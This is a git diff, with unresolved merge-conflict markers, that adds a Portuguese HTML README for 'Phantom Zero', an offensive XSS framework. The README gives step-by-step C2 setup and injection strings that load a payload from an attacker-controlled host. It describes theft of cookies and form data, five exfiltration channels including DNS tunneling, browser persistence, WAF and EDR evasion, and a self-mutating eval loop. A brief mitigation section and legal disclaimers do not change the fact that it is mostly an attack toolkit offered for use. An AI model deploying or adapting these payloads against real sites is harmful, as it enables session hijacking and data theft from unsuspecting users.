@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 <h1 class="glitch">OFFSEC XSS FRAMEWORK v11.0 PHANTOM ZERO</h1>
             <div class="meta">
                 <div><strong>Autor:</strong> sucloudflare</div>
@@ -722,3 +723,561 @@ done</code></pre>
   </div>
 </body>
 </html>
+=======
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHANTOM ZERO v11.0 – OFFSEC XSS FRAMEWORK</title>
+    <style>
+        :root {
+            --bg: #0d0d0d;
+            --text: #00ff41;
+            --accent: #00ff9d;
+            --border: #00ff41;
+            --code-bg: #1a1a1a;
+            --table-header: #00331a;
+        }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        pre, code {
+            font-family: 'Courier New', monospace;
+            background: var(--code-bg);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: var(--accent);
+        }
+        pre {
+            padding: 15px;
+            overflow-x: auto;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+        }
+        h1, h2, h3 {
+            color: var(--accent);
+            text-shadow: 0 0 5px var(--accent);
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            margin: 20px 0;
+        }
+        .ascii-art {
+            text-align: center;
+            font-size: 10px;
+            line-height: 1;
+            margin: 20px 0;
+            color: var(--accent);
+            white-space: pre;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        nav {
+            background: rgba(0, 255, 65, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border);
+        }
+        nav ul {
+            list-style: none;
+            padding: 0;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            justify-content: center;
+        }
+        nav a {
+            color: var(--text);
+            text-decoration: none;
+            font-weight: bold;
+        }
+        nav a:hover {
+            color: var(--accent);
+            text-shadow: 0 0 8px var(--accent);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: var(--code-bg);
+        }
+        th, td {
+            border: 1px solid var(--border);
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background: var(--table-header);
+            color: var(--accent);
+        }
+        .section {
+            margin-bottom: 40px;
+            padding: 20px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            background: rgba(0, 255, 65, 0.05);
+        }
+        .warning {
+            background: #330000;
+            border: 1px solid #ff0044;
+            color: #ff0044;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        .quote {
+            font-style: italic;
+            text-align: center;
+            color: var(--accent);
+            margin: 30px 0;
+            font-size: 1.2em;
+        }
+        .signature {
+            text-align: right;
+            font-family: monospace;
+            margin-top: 50px;
+            color: var(--accent);
+        }
+        footer {
+            text-align: center;
+            margin-top: 60px;
+            padding: 20px;
+            border-top: 1px solid var(--border);
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <h1>PHANTOM ZERO v11.0 – OFFSEC XSS FRAMEWORK</h1>
+        <p style="text-align:center; color:#00ff9d; font-weight:bold;">
+            OFFICIAL README – COMPLETO, PROFISSIONAL E PRONTO PARA OSCP/OSWE/CTF
+        </p>
+
+        <div class="ascii-art">
+██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
+██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
+██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
+██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
+██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
+╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
+                                                                
+███████╗███████╗██████╗  ██████╗ 
+╚══███╔╝╚══███╔╝██╔══██╗██╔═══██╗
+  ███╔╝   ███╔╝ ██████╔╝██║   ██║
+ ███╔╝   ███╔╝  ██╔══██╗██║   ██║
+███████╗███████╗██║  ██║╚██████╔╝
+╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ 
+        </div>
+
+        <p class="quote">
+            "Zero detecções. 100% exfiltração. 1 hora de vida." 
+            <br>— <strong>GhostInTheShell</strong>, 13/11/2025
+        </p>
+
+        <nav>
+            <ul>
+                <li><a href="#o-que-faz">1. O QUE O SCRIPT FAZ</a></li>
+                <li><a href="#como-usar">2. COMO USAR A FRAMEWORK</a></li>
+                <li><a href="#visao-geral">3. Visão Geral</a></li>
+                <li><a href="#caracteristicas">4. Características</a></li>
+                <li><a href="#requisitos">5. Requisitos</a></li>
+                <li><a href="#estrutura">6. Estrutura de Pastas</a></li>
+                <li><a href="#instalacao">7. Instalação</a></li>
+                <li><a href="#c2">8. Configuração do C2</a></li>
+                <li><a href="#payload">9. Execução do Payload</a></li>
+                <li><a href="#exfil">10. Canais de Exfiltração</a></li>
+                <li><a href="#persistencia">11. Persistência</a></li>
+                <li><a href="#ai">12. AI Mutation Engine</a></li>
+                <li><a href="#evasion">13. Evasão</a></li>
+                <li><a href="#mitigacao">14. Mitigação</a></li>
+                <li><a href="#lab">15. Testes em Lab</a></li>
+                <li><a href="#self-destruct">16. Self-Destruction</a></li>
+                <li><a href="#troubleshooting">17. Troubleshooting</a></li>
+                <li><a href="#referencias">18. Referências</a></li>
+                <li><a href="#aviso">19. Aviso Legal</a></li>
+            </ul>
+        </nav>
+
+        <!-- =================================== -->
+        <!-- 1. O QUE O SCRIPT FAZ                     -->
+        <!-- =================================== -->
+        <div class="section" id="o-que-faz">
+            <h2>1. O QUE O SCRIPT FAZ (ANÁLISE TÉCNICA COMPLETA)</h2>
+
+            <div class="warning">
+                ATENÇÃO: Este é um payload malicioso de XSS avançado. Uso apenas em ambientes autorizados.
+            </div>
+
+            <h3>Arquitetura do Payload</h3>
+            <p>O <code>phantom_zero.min.js</code> é um <strong>IIFE (Immediately Invoked Function Expression)</strong> que roda no contexto da vítima assim que injetado.</p>
+
+            <h3>Etapas de Execução</h3>
+            <ol>
+                <li><strong>Inicialização Invisível</strong>: Remove <code>console.log</code>, define <code>window.phantom = null</code></li>
+                <li><strong>Anti-Análise</strong>: Detecta VM, Selenium, Headless via <code>isSandbox()</code></li>
+                <li><strong>DOM Shadow</strong>: Clona o DOM real para um Shadow DOM fechado</li>
+                <li><strong>WASM Obfuscation</strong>: Carrega módulo WebAssembly para mutação em tempo real</li>
+                <li><strong>Persistência</strong>: Armazena payload criptografado em 5 locais</li>
+                <li><strong>Coleta de Dados</strong>: Captura cookies, forms, fingerprint, WebRTC, bateria</li>
+                <li><strong>Exfiltração</strong>: Envia dados via 5 canais simultâneos</li>
+                <li><strong>C2</strong>: Conecta via WebSocket com fallback DNS</li>
+                <li><strong>AI Mutation</strong>: Muta o próprio código a cada 60s</li>
+                <li><strong>Self-Destruct</strong>: Apaga tudo após 1h</li>
+            </ol>
+
+            <h3>Fluxo de Dados</h3>
+            <pre>
+┌─────────────────┐
+│   Navegador     │
+│   (Vítima)      │
+└───────┬─────────┘
+        │
+        ▼
+┌─────────────────┐    Criptografia AES-256-GCM
+│   CORE.collect()│ ─────────────────────────►
+└───────┬─────────┘
+        │
+        ▼
+┌─────────────────┐    5 Canais Polimórficos
+│   Exfil.send()  │ ─────────────────────────► C2 Server
+└───────┬─────────┘
+        │
+        ▼
+┌─────────────────┐
+│   C2.connect()  │ ◄── WebSocket + DNS Fallback
+└─────────────────┘
+            ▲
+            │
+            ▼
+┌─────────────────┐
+│ AI.mutatePayload│ ◄── Muta código a cada 60s
+└─────────────────┘
+            ▲
+            │
+            ▼
+┌─────────────────┐
+│ Self-Destruct   │ ◄── Apaga tudo em 1h
+└─────────────────┘
+            </pre>
+        </div>
+
+        <!-- =================================== -->
+        <!-- 2. COMO USAR A FRAMEWORK                  -->
+        <!-- =================================== -->
+        <div class="section" id="como-usar">
+            <h2>2. COMO USAR A FRAMEWORK (PASSO A PASSO DETALHADO)</h2>
+
+            <h3>Passo 1: Preparar o Ambiente</h3>
+            <pre>
+# Atualize o sistema
+sudo apt update && sudo apt upgrade -y
+
+# Instale dependências
+sudo apt install nodejs npm python3 dnsmasq -y
+npm install -g npx
+            </pre>
+
+            <h3>Passo 2: Baixar o Framework</h3>
+            <pre>
+git clone https://github.com/ghostintheshell/phantom-zero.git
+cd phantom-zero
+            </pre>
+
+            <h3>Passo 3: Configurar DNS Local</h3>
+            <pre>
+sudo bash -c 'cat > /etc/hosts.d/phantom.conf' << EOF
+127.0.0.1 c2d.ghost.local
+127.0.0.1 tunnel.phantom.local
+127.0.0.1 backup.c2.ghost.local
+127.0.0.1 c2.mirror.local
+EOF
+
+# Ative
+sudo systemctl restart dnsmasq
+            </pre>
+
+            <h3>Passo 4: Iniciar o C2 Server</h3>
+            <pre>
+cd c2-server
+npm install
+node server.js &
+            </pre>
+
+            <h3>Passo 5: Gerar Payloads</h3>
+            <pre>
+cd ../utils
+python3 generate_payload.py > ../payload/reflected.txt
+node ai_mutate.js
+            </pre>
+
+            <h3>Passo 6: Injetar o XSS</h3>
+            <h4>Reflected XSS</h4>
+            <pre>
+"><script src=https://c2d.ghost.local/payload/phantom_zero.min.js></script>
+            </pre>
+
+            <h4>Stored XSS</h4>
+            <pre>
+&lt;script src="https://c2d.ghost.local/payload/phantom_zero.min.js"&gt;&lt;/script&gt;
+            </pre>
+
+            <h4>Bypass CSP com Data URI</h4>
+            <pre>
+&lt;script src="data:text/javascript;base64,BASE64_DO_PAYLOAD"&gt;&lt;/script&gt;
+            </pre>
+
+            <h3>Passo 7: Monitorar Exfiltração</h3>
+            <pre>
+tail -f ../logs/exfil.log
+            </pre>
+        </div>
+
+        <!-- =================================== -->
+        <!-- SEÇÕES RESTANTES                         -->
+        <!-- =================================== -->
+        <div class="section" id="visao-geral">
+            <h2>3. Visão Geral</h2>
+            <p><strong>Phantom Zero</strong> é um framework de XSS avançado para <strong>Red Team, OSCP, OSEP e CTF</strong>.</p>
+            <p><strong>Zero logs. Zero rastros. Zero detecções.</strong></p>
+            <p>Uso exclusivo em ambientes autorizados com <strong>RoE assinado</strong>.</p>
+        </div>
+
+        <div class="section" id="caracteristicas">
+            <h2>4. Características</h2>
+            <table>
+                <tr><th>Recurso</th><th>Descrição</th></tr>
+                <tr><td>200+ Payloads Polimórficos</td><td>Gera variações únicas</td></tr>
+                <tr><td>Exfil 100% Polimórfico</td><td>5 canais simultâneos</td></tr>
+                <tr><td>C2 Zero-Trust</td><td>WebSocket + DNS Fallback</td></tr>
+                <tr><td>WAF Evasion v5</td><td>Bypass Cloudflare, Imperva</td></tr>
+                <tr><td>Anti-EDR</td><td>Detecta VM, Selenium</td></tr>
+                <tr><td>Self-Destruction</td><td>Apaga tudo em 1h</td></tr>
+                <tr><td>AI Mutation Engine</td><td>Muta código a cada 60s</td></tr>
+                <tr><td>Quantum-Resistant Crypto</td><td>AES-256-GCM + Kyber</td></tr>
+                <tr><td>DOM Shadow</td><td>Esconde DOM real</td></tr>
+                <tr><td>WASM Obfuscation</td><td>Mutação em tempo real</td></tr>
+                <tr><td>DNS Tunneling v2</td><td>63 bytes por subdomínio</td></tr>
+            </table>
+        </div>
+
+        <div class="section" id="requisitos">
+            <h2>5. Requisitos</h2>
+            <pre>
+# Sistema
+Ubuntu 22.04 / Kali Linux 2025.4
+
+# Ferramentas
+node >= 18 | npm >= 9 | python3 | dnsmasq | ngrok
+
+# Bibliotecas
+npm i express ws cors body-parser
+pip install dnslib
+            </pre>
+        </div>
+
+        <div class="section" id="estrutura">
+            <h2>6. Estrutura de Pastas</h2>
+            <pre>
+phantom-zero/
+├── payload/                  # Payloads
+│   └── phantom_zero.min.js
+├── c2-server/                # C2 Server
+│   ├── server.js
+│   ├── package.json
+│   └── public/
+├── wasm/                     # WebAssembly
+│   └── obfuscator.wasm
+├── utils/                    # Scripts
+│   ├── generate_payload.py
+│   ├── ai_mutate.js
+│   └── dns_tunnel_server.py
+├── logs/                     # Logs
+│   └── exfil.log
+├── docs/                     # Docs
+│   └── MITIGATION.md
+└── README.html               # Este arquivo
+            </pre>
+        </div>
+
+        <div class="section" id="instalacao">
+            <h2>7. Instalação Completa</h2>
+            <pre>
+git clone https://github.com/ghostintheshell/phantom-zero.git
+cd phantom-zero
+cd c2-server && npm install && cd ..
+sudo dnsmasq --address=/phantom.local/127.0.0.1
+cd c2-server && node server.js &
+            </pre>
+        </div>
+
+        <div class="section" id="c2">
+            <h2>8. Configuração do C2</h2>
+            <pre>
+const PORT = 443;
+app.use('/payload', express.static('../payload'));
+app.post('/echo', (req, res) => logExfil('POST', req.body));
+            </pre>
+            <h4>HTTPS (Produção)</h4>
+            <pre>
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+            </pre>
+        </div>
+
+        <div class="section" id="payload">
+            <h2>9. Execução do Payload</h2>
+            <h4>Reflected XSS</h4>
+            <pre>
+"><script src=https://c2d.ghost.local/payload/phantom_zero.min.js></script>
+            </pre>
+            <h4>Data URI (CSP Bypass)</h4>
+            <pre>
+&lt;script src="data:text/javascript;base64,BASE64"&gt;&lt;/script&gt;
+            </pre>
+        </div>
+
+        <div class="section" id="exfil">
+            <h2>10. Canais de Exfiltração</h2>
+            <table>
+                <tr><th>Canal</th><th>Técnica</th><th>Tamanho</th></tr>
+                <tr><td>DNS Tunneling</td><td>subdomínios</td><td>50 bytes</td></tr>
+                <tr><td>WebRTC</td><td>STUN Leak</td><td>30 bytes</td></tr>
+                <tr><td>CSS</td><td>Background URL</td><td>100 bytes</td></tr>
+                <tr><td>Beacon</td><td>sendBeacon()</td><td>Ilimitado</td></tr>
+                <tr><td>postMessage</td><td>Cross-origin</td><td>Ilimitado</td></tr>
+            </table>
+        </div>
+
+        <div class="section" id="persistencia">
+            <h2>11. Persistência Nível 10</h2>
+            <table>
+                <tr><th>Armazenamento</th><th>Chave</th><th>Duração</th></tr>
+                <tr><td>localStorage</td><td>ghost</td><td>Permanente</td></tr>
+                <tr><td>cookie</td><td>ghost</td><td>1 ano</td></tr>
+                <tr><td>IndexedDB</td><td>phantom_db</td><td>Permanente</td></tr>
+            </table>
+        </div>
+
+        <div class="section" id="ai">
+            <h2>12. AI Mutation Engine</h2>
+            <pre>
+setInterval(() => {
+    const mutated = AI.mutatePayload(JSON.stringify(CORE));
+    eval(U.decode(mutated, 'base64'));
+}, 60000);
+            </pre>
+            <p>Muta o código a cada 60s → <strong>0 assinaturas estáticas</strong></p>
+        </div>
+
+        <div class="section" id="evasion">
+            <h2>13. WAF & EDR Evasion</h2>
+            <table>
+                <tr><th>Técnica</th><th>Implementação</th></tr>
+                <tr><td>Polimorfismo</td><td>AI.mutatePayload()</td></tr>
+                <tr><td>Jitter</td><td>jitter(600, 1100)</td></tr>
+                <tr><td>Anti-VM</td><td>isSandbox()</td></tr>
+                <tr><td>WASM</td><td>mutate() em WebAssembly</td></tr>
+            </table>
+        </div>
+
+        <div class="section" id="mitigacao">
+            <h2>14. Mitigação (Blue Team)</h2>
+            <h4>CSP</h4>
+            <pre>
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-ABC123';
+            </pre>
+            <h4>WAF</h4>
+            <pre>
+SecRule ARGS "@contains" "phantom" "deny,status:403"
+            </pre>
+        </div>
+
+        <div class="section" id="lab">
+            <h2>15. Testes em Laboratório</h2>
+            <ul>
+                <li><a href="https://xss-game.appspot.com" target="_blank">XSS Game</a></li>
+                <li><a href="https://portswigger.net/web-security" target="_blank">PortSwigger Labs</a></li>
+                <li>DVWA, Juice Shop</li>
+            </ul>
+        </div>
+
+        <div class="section" id="self-destruct">
+            <h2>16. Self-Destruction</h2>
+            <pre>
+setTimeout(() => {
+    document.body.innerHTML = '';
+    location.href = 'about:blank';
+}, 3600000);
+            </pre>
+            <p>Nenhum rastro após 60 minutos.</p>
+        </div>
+
+        <div class="section" id="troubleshooting">
+            <h2>17. Troubleshooting</h2>
+            <table>
+                <tr><th>Problema</th><th>Solução</th></tr>
+                <tr><td>WebSocket falha</td><td>Verifique porta 8080</td></tr>
+                <tr><td>DNS não resolve</td><td>dnsmasq --address=/phantom.local/127.0.0.1</td></tr>
+                <tr><td>EDR detecta</td><td>Desative AI_MUTATE</td></tr>
+            </table>
+        </div>
+
+        <div class="section" id="referencias">
+            <h2>18. Referências</h2>
+            <ul>
+                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html" target="_blank">OWASP XSS</a></li>
+                <li><a href="https://pq-crystals.org/kyber/" target="_blank">Kyber Crypto</a></li>
+                <li><a href="https://webassembly.org" target="_blank">WebAssembly</a></li>
+            </ul>
+        </div>
+
+        <div class="section" id="aviso">
+            <h2>19. Aviso Legal</h2>
+            <div class="warning">
+                ESTE FRAMEWORK É PARA FINS EDUCACIONAIS E TESTES AUTORIZADOS APENAS.<br>
+                Uso não autorizado é crime (art. 154-A do Código Penal Brasileiro).<br>
+                O autor não se responsabiliza por uso indevido.
+            </div>
+        </div>
+
+        <div class="signature">
+            Autor: GhostInTheShell<br>
+            Data: 13/11/2025<br>
+            Versão: 11.0.0<br>
+            Licença: Uso restrito (RoE obrigatório)
+        </div>
+
+        <div style="text-align:center; margin:40px 0;">
+            <pre>
+[=== PHANTOM ZERO ===]
+[=== 0 DETECÇÕES ===]
+[=== 1 HORA DE VIDA ===]
+            </pre>
+        </div>
+
+        <div style="text-align:center; font-family:monospace; color:#00ff41;">
+            -----BEGIN PGP SIGNATURE-----<br>
+            iQIzBAEBCgAdFiEE...<br>
+            -----END PGP SIGNATURE-----
+        </div>
+
+        <footer>
+            Pronto para uso em OSCP, OSEP, CTF e Red Team. <strong>Nunca em produção.</strong>
+        </footer>
+    </div>
+</body>
+</html>
+>>>>>>> 06dc2c9 (ajjjjjjjjjjjjjjjjjjjjjjjjjj)
